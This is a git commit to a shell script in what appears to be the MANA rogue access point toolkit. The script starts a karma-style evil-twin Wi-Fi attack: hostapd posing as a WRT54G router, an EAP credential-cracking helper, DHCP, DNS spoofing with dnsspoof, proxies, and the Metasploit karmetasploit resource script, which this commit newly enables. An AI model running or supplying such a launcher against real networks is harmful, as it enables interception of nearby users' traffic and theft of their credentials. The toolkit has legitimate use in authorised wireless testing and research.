d06060ccf92725d57b00062b3328397cc9831e67
singe <singe-github@singe.za.net>
2014-08-06 21:29:41 +0200

    Fixed up start scripts and confs, and added EAP start script

--- run-mana/start-noupstream-eap.sh
+++ run-mana/start-noupstream-eap.sh
@@ -1,18 +1,23 @@
 phy=wlan0
 phy0="wlan0_0"
+conf=conf/hostapd-karma.conf
+hostapd=../hostapd-manna/hostapd/hostapd
+crackapd=../crackapd/crackapd.py
 
 hostname WRT54G
 echo hostname WRT54G
 sleep 2
 
 # Get the FIFO for the crack stuffs. Create the FIFO and kick of python process
-export EXNODE=`cat ~/hostapd/etc/hostapd-karma-multi.conf | grep ennode | cut -f2 -d"="`
+export EXNODE=`cat $conf | grep ennode | cut -f2 -d"="`
 echo $EXNODE
 mkfifo $EXNODE
-/usr/bin/python ~/hostapd/rogue-ap/crackapd.py&
+$crackapd&
 
 # Start hostapd
-~/hostapd/hostapd/hostapd ~/hostapd/etc/hostapd-karma-multi.conf&
+sed -i "s/^interface=.*$/interface=$phy/" $conf
+sed -i "s/^bss=.*$/bss=$phy0/" $conf
+$hostapd $conf&
 sleep 5
 ifconfig $phy
 ifconfig $phy0
@@ -21,14 +26,14 @@ route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
 ifconfig $phy0 10.1.0.1 netmask 255.255.255.0
 route add -net 10.1.0.0 netmask 255.255.255.0 gw 10.1.0.1
 
-dhcpd -cf ~/hostapd/etc/dhcpd.conf $phy
-dhcpd -pf /var/run/dhcpd-two.pid -lf /var/lib/dhcp/dhcpd-two.leases -cf ~/hostapd/etc/dhcpd-two.conf $phy0
-dnsspoof -i $phy -f ~/hostapd/etc/dns.txt&
-dnsspoof -i $phy0 -f ~/hostapd/etc/dns.txt&
+dhcpd -cf conf/dhcpd.conf $phy
+dhcpd -pf /var/run/dhcpd-two.pid -lf /var/lib/dhcp/dhcpd-two.leases -cf conf/dhcpd-two.conf $phy0
+dnsspoof -i $phy -f conf/dnsspoof.conf&
+dnsspoof -i $phy0 -f conf/dnsspoof.conf&
 service apache2 start
 service stunnel4 start
-tinyproxy -c ~/hostapd/etc/tinyproxy.conf
-#msfconsole -r simple-karma.rc
+tinyproxy -c conf/tinyproxy.conf&
+msfconsole -r conf/karmetasploit.rc&
 
 service ferm stop
 echo '1' > /proc/sys/net/ipv4/ip_forward
@@ -43,12 +48,11 @@ read
 pkill hostapd
 rm /tmp/crackapd.run
 rm $EXNODE
-pkill airbase-ng
-pkill dhcpd3
 pkill dhcpd
 pkill dnsspoof
 pkill tinyproxy
 pkill stunnel4
+pkill msfconsole
 service apache2 stop
 iptables -t nat -F
 service ferm start
